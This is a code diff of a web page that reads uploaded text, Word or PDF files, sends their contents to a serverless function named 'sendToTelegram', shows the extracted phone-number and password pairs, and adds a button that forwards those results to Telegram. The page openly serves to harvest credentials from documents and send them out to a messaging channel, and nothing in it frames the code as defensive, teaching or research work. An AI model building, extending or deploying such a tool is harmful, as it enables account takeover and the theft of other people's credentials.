@@ -8,72 +8,129 @@
     body { font-family: Arial, sans-serif; margin: 20px; }
     input[type="file"] { margin-bottom: 10px; }
     button { margin-top: 10px; margin-right: 10px; }
-    /* Make the output textarea visible */
     #output { width: 100%; height: 200px; margin-top: 10px; }
   </style>
 </head>
 <body>
   <h1>Upload Document & Extract Phone & Passwords</h1>
-  <input type="file" id="fileInput" />
-  <br />
-  <button id="startBtn">Start</button>
-  <button id="copyBtn">Copy Output</button>
-  <br />
+  <form id="uploadForm">
+    <input type="file" id="fileInput" required />
+    <br />
+    <button type="submit" id="startBtn">Start</button>
+    <button type="button" id="copyBtn" disabled>Copy Output</button>
+    <button type="button" id="sendBtn" disabled>Send to Telegram</button>
+  </form>
   <textarea id="output" readonly></textarea>
 
-  <!-- Mammoth for DOCX -->
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/mammoth/1.4.2/mammoth.browser.min.js"></script>
   <script>
-    document.getElementById('startBtn').addEventListener('click', async () => {
-      const fileInput = document.getElementById('fileInput');
-      const outputArea = document.getElementById('output');
-      outputArea.value = ''; // Clear previous output
+    // Select elements
+    const form = document.getElementById('uploadForm');
+    const fileInput = document.getElementById('fileInput');
+    const outputArea = document.getElementById('output');
+    const copyBtn = document.getElementById('copyBtn');
+    const sendBtn = document.getElementById('sendBtn');
 
-      if (!fileInput.files[0]) {
-        alert('Please select a document.');
+    // Handle form submission
+    form.addEventListener('submit', async (e) => {
+      e.preventDefault();
+      console.log('Form submitted'); // Debug
+
+      // Reset UI
+      outputArea.value = '';
+      copyBtn.disabled = true;
+      sendBtn.disabled = true;
+
+      const file = fileInput.files[0];
+      if (!file) {
+        alert('Please select a file.');
         return;
       }
-      const file = fileInput.files[0];
 
-      // Read file as ArrayBuffer or text depending on type
+      console.log('Selected file:', file.name); // Debug
+
       const reader = new FileReader();
+
       reader.onload = async () => {
-        const arrayBuffer = reader.result;
-        // Convert ArrayBuffer to base64
-        const uint8Array = new Uint8Array(arrayBuffer);
-        const binaryString = Array.from(uint8Array).map(b => String.fromCharCode(b)).join('');
-        const base64Data = btoa(binaryString);
+        console.log('File loaded'); // Debug
+        let fileData;
 
-        // Send to serverless function
-        const response = await fetch('/.netlify/functions/sendToTelegram', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({
-            fileName: file.name,
-            fileType: file.name.split('.').pop().toLowerCase(),
-            fileData: base64Data
-          })
-        });
-        const result = await response.json();
+        if (file.name.endsWith('.txt')) {
+          fileData = reader.result; // text
+          console.log('Text file content:', fileData.substring(0, 100)); // Debug
+        } else if (file.name.endsWith('.docx') || file.name.endsWith('.pdf')) {
+          // For binary files, convert to base64
+          const arrayBuffer = reader.result;
+          const uint8Array = new Uint8Array(arrayBuffer);
+          const binaryString = Array.from(uint8Array).map(b => String.fromCharCode(b)).join('');
+          fileData = btoa(binaryString);
+          console.log('Binary file converted to base64'); // Debug
+        } else {
+          alert('Unsupported file type.');
+          return;
+        }
 
-        // Display the extracted results
-        outputArea.value = result.results || 'No phone/password pairs found.';
+        // Send data to your serverless function
+        try {
+          console.log('Sending data to serverless'); // Debug
+          const response = await fetch('/.netlify/functions/sendToTelegram', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+              fileName: file.name,
+              fileType: file.name.split('.').pop().toLowerCase(),
+              fileData: fileData
+            })
+          });
+          console.log('Fetch response:', response); // Debug
+          const result = await response.json();
+          console.log('Server response:', result); // Debug
+
+          // Show results
+          outputArea.value = result.results || 'No data found.';
+          // Enable copy and send buttons
+          copyBtn.disabled = false;
+          sendBtn.disabled = false;
+        } catch (err) {
+          console.error('Error:', err);
+          alert('Error contacting serverless function.');
+        }
       };
 
+      // Read the file
       if (file.name.endsWith('.txt')) {
         reader.readAsText(file);
-      } else if (file.name.endsWith('.docx')) {
-        reader.readAsArrayBuffer(file);
       } else {
-        alert('Unsupported file. Use .txt or .docx');
+        reader.readAsArrayBuffer(file);
       }
     });
 
-    document.getElementById('copyBtn').addEventListener('click', () => {
-      const outputArea = document.getElementById('output');
+    // Copy output to clipboard
+    copyBtn.addEventListener('click', () => {
       outputArea.select();
       document.execCommand('copy');
       alert('Output copied to clipboard!');
+    });
+
+    // Send message to Telegram
+    sendBtn.addEventListener('click', async () => {
+      const message = outputArea.value;
+      if (!message) {
+        alert('No message to send.');
+        return;
+      }
+      try {
+        const response = await fetch('/.netlify/functions/sendToTelegram', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ message })
+        });
+        const result = await response.json();
+        console.log('Telegram response:', result);
+        alert('Message sent to Telegram!');
+      } catch (err) {
+        console.error('Error sending to Telegram:', err);
+        alert('Failed to send message.');
+      }
     });
   </script>
 </body>
